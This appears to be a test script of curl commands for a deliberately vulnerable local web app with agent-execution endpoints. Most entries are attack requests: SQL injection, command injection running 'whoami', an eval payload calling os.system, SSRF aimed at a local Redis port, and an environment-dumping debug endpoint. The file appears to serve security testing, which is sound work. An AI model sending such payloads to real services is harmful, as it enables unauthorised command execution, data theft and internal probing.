# 1. Health check
curl http://localhost:7777/

# 2. Check traffic simulator status
curl http://localhost:7777/api/traffic/stats

# 3. SQL Injection - Direct query
curl -X POST http://localhost:7777/api/query \
  -H "Content-Type: application/json" \
  -d '{"query": "SELECT * FROM sensitive_data"}'

# 4. SQL Injection - User endpoint
curl http://localhost:7777/api/user/user-001

# 5. Command Injection
curl -X POST http://localhost:7777/api/agent/execute \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "user-001",
    "prompt": "execute command",
    "context": {"command": "whoami"},
    "tools": []
  }'

# 6. Code Execution (eval)
curl -X POST http://localhost:7777/api/agent/execute \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "user-001",
    "prompt": "execute code",
    "context": {"eval": "__import__('\''os'\'').system('\''ls -la'\'')"},
    "tools": []
  }'

# 7. SSRF Attack
curl -X POST http://localhost:7777/api/agent/direct \
  -H "Content-Type: application/json" \
  -d '{
    "agent_url": "http://localhost:6379/",
    "payload": {}
  }'

# 8. Trigger manual traffic burst
curl -X POST http://localhost:7777/api/traffic/manual

# 9. Debug endpoint (info disclosure)
curl http://localhost:7777/api/debug/env